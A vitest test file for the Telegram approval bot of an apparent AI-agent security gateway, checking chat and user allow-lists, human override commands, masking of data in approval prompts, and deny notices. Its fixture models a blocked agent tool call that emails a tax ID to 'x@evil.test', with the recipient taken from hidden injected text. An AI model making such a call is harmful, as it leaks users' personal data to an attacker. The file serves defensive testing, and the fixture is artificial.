import { describe, expect, it } from "vitest";
import { SentinelBus } from "../src/integrations/bus.js";
import { startTelegramBot } from "../src/integrations/telegramBot.js";
import type { Decision } from "../src/types.js";

const CHAT = "-1001";
const ALLOWED_USER = 42;

function setup(opts: { users?: string[] } = {}) {
  const calls: { method: string; payload: any }[] = [];
  const bus = new SentinelBus();
  const resolved: [string, boolean, string][] = [];
  const granted: string[] = [];
  const tg = startTelegramBot({
    token: "1:test",
    allowedChatId: CHAT,
    allowedUserIds: opts.users ?? [String(ALLOWED_USER)],
    timeoutSeconds: () => 60,
    bus,
    resolve: (id, approve, approver) => (resolved.push([id, approve, approver]), true),
    pending: () => [],
    notifyDeny: true,
    commands: {
      status: async () => "STATUS OK",
      verify: async () => "CHAIN OK",
      replay: async (id) => `REPLAY ${id}`,
      trace: async (q) => `TRACE ${q}`,
      overrideGrant: async (p, t, m, by) => (granted.push(`${p}/${t}/${m}/${by}`), "GRANTED"),
      overrideList: () => "NONE",
      overrideClear: async () => "CLEARED",
    },
    testing: {
      botInfo: { id: 1, is_bot: true, first_name: "Sentinel", username: "sentinel_bot", can_join_groups: true, can_read_all_group_messages: false, supports_inline_queries: false, can_connect_to_business: false, has_main_web_app: false } as any,
      transformer: async (_prev, method, payload) => {
        calls.push({ method, payload });
        return { ok: true, result: method === "sendMessage" ? { message_id: calls.length, date: 0, chat: { id: Number(CHAT), type: "group" } } : true } as any;
      },
    },
  });
  let updateId = 1;
  const command = (text: string, from = ALLOWED_USER, chat = CHAT) =>
    tg.bot.handleUpdate({
      update_id: updateId++,
      message: { message_id: updateId, date: 0, chat: { id: Number(chat), type: "group", title: "g" }, from: { id: from, is_bot: false, first_name: "u", username: "u" }, text, entities: [{ type: "bot_command", offset: 0, length: text.split(" ")[0].length }] },
    } as any);
  const press = (data: string, from = ALLOWED_USER, chat = CHAT) =>
    tg.bot.handleUpdate({
      update_id: updateId++,
      callback_query: { id: "cb", chat_instance: "x", data, from: { id: from, is_bot: false, first_name: "u", username: "approver" }, message: { message_id: 1, date: 0, chat: { id: Number(chat), type: "group", title: "g" } } },
    } as any);
  const replies = () => calls.filter((c) => c.method === "sendMessage").map((c) => c.payload.text as string);
  return { tg, bus, calls, command, press, replies, resolved, granted };
}

const decision = (verdict: Decision["verdict"]): Decision =>
  ({ decision_id: "dec_1", verdict, rule_id: "R4", impact: "high", shield: true, session_tainted: true, reasons: [{ code: "ARG_FROM_UNTRUSTED_CONTENT", message: "Recipient came from hidden text." }], call: { tool: "send_email", profile: "research_assistant", args: { to: "x@evil.test", body: "PAN ABCPE1234F" } } }) as unknown as Decision;

describe("telegram bot", () => {
  it("answers commands only in the allowed chat, from allowed users", async () => {
    const t = setup();
    await t.command("/status");
    await t.command("/replay dec_9");
    await t.command("/trace evil.test");
    await t.command("/status", 999); // not an allowed user
    await t.command("/status", ALLOWED_USER, "-555"); // wrong chat
    expect(t.replies()).toEqual(["STATUS OK", "REPLAY dec_9", "TRACE evil.test"]);
  });

  it("validates /override and needs a user allow-list", async () => {
    const t = setup();
    await t.command("/override research_assistant send_payment 15");
    await t.command("/override research_assistant send_payment");
    expect(t.granted).toEqual(["research_assistant/send_payment/15/telegram:u"]);
    expect(t.replies()[1]).toMatch(/Usage/);
    const open = setup({ users: [] });
    await open.command("/override research_assistant send_payment 15");
    expect(open.replies()[0]).toMatch(/disabled/);
  });

  it("sends approval requests with buttons, masks data, and only lets allowed users answer", async () => {
    const t = setup();
    await t.bus.publish({ type: "approval.requested", run_id: "r", decision: decision("REQUIRE_APPROVAL") });
    const msg = t.calls.find((c) => c.method === "sendMessage")!;
    expect(msg.payload.reply_markup.inline_keyboard[0].map((b: any) => b.callback_data)).toEqual(["a:dec_1", "r:dec_1"]);
    expect(msg.payload.text).not.toContain("ABCPE1234F");
    await t.press("a:dec_1", 999);
    expect(t.resolved).toEqual([]);
    await t.press("a:dec_1");
    expect(t.resolved).toEqual([["dec_1", true, "telegram:approver"]]);
  });

  it("reports outright DENY once", async () => {
    const t = setup();
    await t.bus.publish({ type: "decision.made", run_id: "r", decision: decision("DENY") });
    await t.bus.publish({ type: "decision.made", run_id: "r", decision: decision("DENY") });
    await new Promise((r) => setTimeout(r, 10));
    const denies = t.replies().filter((x) => x.startsWith("⛔"));
    expect(denies).toHaveLength(1);
    expect(denies[0]).toMatch(/send_email \(rule R4/);
  });
});
